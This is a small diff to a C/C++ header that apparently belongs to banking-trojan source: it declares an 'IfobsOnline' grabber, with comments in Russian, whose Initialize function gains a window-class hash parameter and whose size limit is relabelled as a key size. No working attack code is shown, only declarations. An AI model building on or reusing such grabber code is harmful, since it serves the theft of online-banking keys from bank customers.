@@ -15,13 +15,13 @@
 #include "BotClasses.h"
 
 
-#define IFOBS_MAX_KEY_PATH_SIZE  3145728   /* Макс 3 мегабайта */
+#define IFOBS_MAX_KEY_PATH_SIZE  3145728   /* Макс. размер ключа 3 мегабайта */
 
 
 namespace IfobsOnline
 {
 	// Функция активирует грабер IfobsOnline
-	bool Initialize(HWND JafaFrameWnd, const char* URL, bool IsChildWnd);
+	bool Initialize(HWND JafaFrameWnd, DWORD ClassWndHash, const char* URL, bool IsChildWnd);
 }
 
 
